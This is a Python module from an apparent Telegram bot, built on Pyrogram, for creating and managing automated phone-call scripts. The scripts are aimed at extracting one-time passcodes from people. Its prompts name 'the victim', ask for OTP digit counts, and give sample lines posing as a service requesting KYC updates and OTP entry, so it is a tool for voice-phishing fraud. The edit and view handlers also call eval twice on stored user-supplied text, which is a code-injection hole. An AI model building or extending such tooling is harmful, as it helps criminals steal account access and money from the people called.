import random

from pyrogram import Client, filters

from .. import helper, START_LOGS, LOGGER
from .database.main_db import TextParts
from ..utils.decorators import blacklist
from ..utils.detect_flood import is_blocked
from ..utils.verify_user import is_valid_user





@Client.on_message(filters.command("create") & filters.private)
@blacklist
@is_blocked
@is_valid_user
async def call(bot, m):
    user_id = m.from_user.id
    alpha = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    salpha = "abcdefghijklmnopqrstuvwxyz"
    num = "1234567890"
    com = alpha+salpha+num
    script_id = "".join(random.sample(com, int(6)))
    await m.reply("You can use some formatting aswell, \n\n> {name}: For the name of the victim\n> {digits}: For the number of digits to be entered (otp)\n> {servicename}: For the name of the service\n\n__These formatting will be useful later.__")
    txt = await m.chat.ask("Please Enter a name for your script: ")
    script_name = txt.text+"_"+str(script_id)
    script_part = await m.chat.ask("Please Enter the first part (intro) of your script (call)🗣: \n\nExample: **We are calling from xyz, This is to inform you to update your kyc details🗣:** ")
    intro = script_part.text
    if len(intro) < 30:
        await m.reply("The intro part should not be less than 30 characters.")
        return
    script_part1 = await m.chat.ask("Please Enter the second part (middle) of your script (call): \n\nExample: **Please enter your otp📞:** ")
    enter_otp = script_part1.text
    if len(enter_otp) < 10:
        await m.reply("The middle part should not be less than 10 characters.")
        return
    script_part2 = await m.chat.ask("Please Enter the asking part of your script (call): \n\nExample: **Please wait while we verify your otp..🆗:** ")
    verifying = script_part2.text
    script_part3_valid = await m.chat.ask("Please Enter the third part (end) of your script (call): \n\nExample:**Otp is valid▶️:** ")
    valid_otp = script_part3_valid.text
    script_part3_invalid = await m.chat.ask("Please Enter the third part (end) of your script (call): \n\nExample: **Sorry, you have entered the wrong otp🙅‍♂️:** ")
    wrong_otp = script_part3_invalid.text
    end_phase = await m.chat.ask("Please Enter the ending phase of your script (call): \n\nExample: **Thank you for using our services🙏🏻:** ")
    end_phase = end_phase.text
    ac = await m.reply("Please wait while we create your script..")
    dic = {"intro": intro, "enter_otp": enter_otp, "verifying": verifying, "valid_otp": valid_otp, "wrong_otp": wrong_otp, "end_phase": end_phase
    }
    updated = str(dic).replace("\n", "").replace(" ", "==")
    TextParts().create_script(script_name, int(user_id), updated)
    try:
        await helper.send_message(START_LOGS, f"📚 **New event** 📚\n\n> Script created by {user_id} with name `{script_name}`.")
    except Exception as e:
        LOGGER.error(e)
    await ac.edit_text(f"Your script has been created successfully with id {script_name}.")



@Client.on_message(filters.command("listscripts") & filters.private)
@blacklist
@is_blocked
@is_valid_user
async def view_script(bot, m):
    user_id = m.from_user.id
    scripts = TextParts().get_scripts(user_id)
    if scripts == None:
        return await m.reply("You have no scripts.")
    text = "Your scripts are:\n\n"
    for i in scripts:
        text += f"**{i[0]}**\n"
    await m.reply(text)


@Client.on_message(filters.command("delete") & filters.private)
@blacklist
@is_blocked
@is_valid_user
async def delete_script(bot, m):
    user_id = m.from_user.id
    scripts = TextParts().get_scripts(user_id)
    if scripts == None:
        return await m.reply("You have no scripts.")
    text = "Your scripts are:\n\n"
    for i in scripts:
        text += f"**{i[0]}**\n"
    await m.reply(text)
    txt = await m.chat.ask("Please Enter the name of the script you want to delete: ")
    script_name = txt.text
    if script_name not in [i[0] for i in scripts]:
        return await m.reply("Invalid script name.")
    TextParts().delete_script(script_name)
    try:
        await helper.send_message(START_LOGS, f"📚 **New event** 📚\n\n> Script deleted by {user_id} with name `{script_name}`.")
    except Exception as e:
        LOGGER.error(e)
    await m.reply("Script deleted successfully.")



@Client.on_message(filters.command("edit_script") & filters.private)
@blacklist
@is_blocked
@is_valid_user
async def edit_script(bot, m):
    user_id = m.from_user.id
    scripts = TextParts().get_scripts(user_id)
    if scripts == None:
        return await m.reply("You have no scripts.")
    text = "--**Available scripts to edit:**--\n\n"
    countt = 1
    for i in scripts:
        text += f"> {countt}: **{i[0]}**\n"
        countt += 1
    which_edit = await m.chat.ask(text+"\nPlease send me the name of the script you want to edit: ")
    script_name = which_edit.text
    if script_name not in [i[0] for i in scripts]:
        return await m.reply("Invalid script name.")
    script = TextParts().get_script_to_edit(script_name)[0]
    script = eval(eval(script.replace("==", " ")))
    if script == None:
        return await m.reply("Invalid script name.")
    is_updated = 0
    new_values = {}
    for i in script.keys():
        txt = await m.chat.ask(f"Current value of **{i}** is: **{script[i]}**\n\n__Please send me the new value of {i} or enter 0 to skip:__ ")
        if txt.text == "0":
            new_values[i] = script[i]
            continue
        else:
            is_updated = 1
            new_values[i] = txt.text
    if is_updated == 0:
        return await m.reply("Nothing to update.")
    else:
        TextParts().update_script(script_name, str(new_values).replace("\n", "").replace(" ", "=="))
        try:
            await helper.send_message(START_LOGS, f"📚 **New event** 📚\n\n> Script edited by {user_id} with name `{script_name}`.")
        except Exception as e:
            LOGGER.error(e)
        await m.reply("Script updated successfully.")


@Client.on_message(filters.command("view_script") & filters.private)
@blacklist
@is_blocked
@is_valid_user
async def view_script(bot, m):
    user_id = m.from_user.id
    scripts = TextParts().get_scripts(user_id)
    if scripts == None:
        return await m.reply("You have no scripts.")
    text = "--**Available scripts to view:**--\n\n"
    countt = 1
    for i in scripts:
        text += f"> {countt}: **{i[0]}**\n"
        countt += 1
    which_edit = await m.chat.ask(text+"\nPlease send me the name of the script you want to view: ")
    script_name = which_edit.text
    if script_name not in [i[0] for i in scripts]:
        return await m.reply("Invalid script name.")
    script = TextParts().get_script_to_edit(script_name)[0]
    script = eval(eval(script.replace("==", " ")))
    if script == None:
        return await m.reply("Invalid script name.")
    text = f"**Script name:** {script_name}\n\n"
    count = 1
    for i in script.keys():
        text += f"> {count} **{i}:** {script[i]}\n\n"
        count += 1
    await m.reply(text)